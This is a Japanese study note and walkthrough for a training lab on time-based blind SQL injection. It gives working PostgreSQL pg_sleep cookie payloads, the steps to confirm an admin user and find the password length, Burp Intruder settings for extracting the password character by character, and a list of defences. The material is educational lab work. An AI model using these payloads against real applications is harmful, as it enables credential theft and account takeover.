## Lab: Blind SQL injection with time delays
	これは時間遅延を使ったBlind SQLインジェクション


## 🧨 これはどんな脆弱性か（本質）
**アプリが SQL の結果もエラーも返さないのに、  
“レスポンス時間の差” から内部の条件分岐を推測できてしまう脆弱性。**

- 表示内容は常に同じ  
- エラーも出ない  
- でも DB が同期実行なので `pg_sleep()` などの遅延がレスポンスに現れる  
→ **時間差が True/False の代わりになる**

---

## 🔍 どう気づくか（検出ポイント）
攻撃者は次のような挙動を観察する。

- Cookie やパラメータに遅延関数を入れるとレスポンスが遅くなる  
  例：`TrackingId=x'||pg_sleep(10)--`
- 表示内容は変わらないのに **レスポンスだけ遅れる**  
- 条件式を変えると遅延の有無が変わる  
  - `1=1` → 遅延あり  
  - `1=2` → 遅延なし  

→ **アプリが SQL を実行している証拠**  
→ **Blind SQLi（時間ベース）確定**

---

## 🎯 どう攻撃するか（攻撃フロー）
攻撃者は「遅延＝True」「遅延なし＝False」として情報を1ビットずつ抜く。

### 1. 遅延が起きるかテスト
```
x'||pg_sleep(10)--
```
→ レスポンスが10秒遅れれば注入成功。

### 2. 条件分岐のテスト
```
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
→ True なら遅延、False なら即時応答。

### 3. ユーザー存在確認
```
username='administrator'
```
→ 遅延 → 存在する。

### 4. パスワード長の特定
```
length(password)>N
```
→ 遅延する最大の N を探す → 長さが判明。

### 5. 各文字の抽出
```
substring(password,1,1)='a'
```
→ 遅延した文字が正解。  
Burp Intruder で a〜z,0〜9 を総当たりして20文字すべて抜く。

### 6. ログインしてアカウント奪取
抽出したパスワードで administrator にログイン。

---

## 🛡️ どう対策するか（実務レベル）
**SQLi 全般の対策に加え、Blind SQLi 特有の対策も必要。**

### 1. **プリペアドステートメント（パラメータ化クエリ）**
- 文字列連結を禁止  
- SQL とデータを分離  
→ これだけでほぼ全ての SQLi が消える

### 2. **ORM / Query Builder の利用**
- 生SQLを極力書かない

### 3. **遅延関数の使用を禁止**
- DBユーザー権限で `pg_sleep()` などを実行不可にする

### 4. **レスポンス時間の均一化**
- ログイン成功/失敗で処理時間を揃える  
- 時間差を攻撃者に使わせない

### 5. **WAF / レート制限**
- 大量の遅延攻撃をブロック  
- Intruder のような自動化攻撃を遅延させる

### 6. **監査ログ**
- 不自然な遅延クエリを検知  
- 早期アラート

---

## 🧩 まとめ（暗記用）
> **「時間遅延型 Blind SQL Injection は、アプリが結果もエラーも返さない状況で、  
> `pg_sleep()` などの遅延を利用して True/False を判定し、  
> パスワード長や各文字を1文字ずつ推測できてしまう脆弱性です。  
> TrackingId に `x'||pg_sleep(10)--` を入れてレスポンスが遅れれば検出できます。  
> 攻撃者は条件分岐を使ってユーザー存在確認やパスワード抽出を行います。  
> 対策はプリペアドステートメントの徹底、遅延関数の制限、  
> レスポンス時間の均一化、レート制限です。」**
---
<br>

# 🧨 Blind SQL Injection（時間遅延）Lab 手順まとめ

## 🛠️ Burp Suite の準備
```
Burp Suite 起動
Proxy タブ → Intercept
「Intercept is off」をクリック → ON にする
ブラウザ（Burp のプロキシ設定済み）を開く
```

---

## Step 1: リクエストをキャプチャ
1. ブラウザで Lab の URL（ショップトップ）を開く  
2. Burp → Proxy → Intercept に戻る  
3. 以下の Cookie 行を探す：

```
Cookie: TrackingId=xxxxxxxxxxxx; session=yyyyyyyyyyyy
```

---

## Step 2: 真の条件テスト（1=1）
TrackingId を以下に置き換える：

```
x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Cookie 行はこうなる：

```
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--; session=yyyyyyyyyyyy
```

- Forward → **10秒遅延**  
- → True 条件で遅延が発生することを確認

## 🔹 CASE 文の本質（これだけ覚えればOK）
```
CASE WHEN 条件 THEN A ELSE B END
```

- 条件 = **True** → A が実行される  
- 条件 = **False** → B が実行される  
- THEN は **True のときだけ**  
- False のとき THEN は **絶対に実行されない**



1=1（True）
```
CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0)
```
→ True → **10秒寝る**  
→ 注入が効いているか確認


1=2（False）
```
CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0)
```
→ False → **0秒（寝ない）**  
→ True/False の時間差が取れることを確認  
→ **Blind SQLi が成立**


## Step 3: 偽の条件テスト（1=2）
TrackingId を以下に変更：

```
x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

- Forward → **遅延なし**  
- → False 条件では遅延しないことを確認

---

## Step 4: administrator ユーザー存在確認
```
x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- 10秒遅延 → **administrator が存在する**

---

## Step 5: パスワード長チェック（>1文字？）
```
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- 遅延あり → パスワードは 1 文字より長い

---

## Step 6: パスワード長の特定
以下を順番に試す：

```
length(password)>2
length(password)>3
...
length(password)>19
length(password)>20
```

結果：

- >19 → 遅延あり  
- >20 → 遅延なし  
→ **パスワード長 = 20 文字**

---

# 🔥 Burp Intruder によるパスワード抽出

## Step 7: Intruder に送る
```
Proxy → HTTP history → 最後のリクエストを右クリック → Send to Intruder
```

---

## Step 8–9: Positions 設定
1. Intruder → Positions  
2. `Clear §` を押す  
3. TrackingId を以下に変更：

```
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

4. `'a'` の部分だけ選択 → `Add §`

結果：

```
substring(password,1,1)='§a§'
```
substring(password, 2, 1) の “1” は「取り出す文字数」や。

つまり：

• 2 → 開始位置（2文字目から）
• 1 → 何文字取るか（1文字だけ）
---

## Step 10: Payload リスト設定
1. Payloads タブ  
2. Payload type: **Simple list**  
3. Add from list → **a-z**  
4. Add from list → **0-9**

→ a〜z, 0〜9 の 36 種類が並ぶ

---

## Step 11: 攻撃開始
- Start attack をクリック  
- 新しいウィンドウが開く

---

## Step 12: 結果確認
1. Columns → **Response received** にチェック  
2. ほとんどが 100〜500ms  
3. **1つだけ 10,000ms（10秒）** がある  
4. その行の Payload が正解の文字

例：

```
m
```

→ 1文字目 = **m**

---

## Step 13: 2文字目以降
Positions に戻り：

```
substring(password,2,1)
```

に変更して再度攻撃。

これを 1〜20 文字目まで繰り返す。

---

## Step 16: ログイン
抽出した 20 文字のパスワードを使って：

```
Username: administrator
Password: (抽出したパスワード)
```

→ **ログイン成功 → Lab Solved 🎉**

---

# 📝 補足

### URL エンコード
| 記号    | エンコード |
|------   |------------|
| `;`     | `%3B` |
| スペース | `+` |

### Intruder の動作
- `§a§` の部分を a〜z,0〜9 に自動置換  
- 36 回リクエスト  
- レスポンス時間で True/False を判定

---


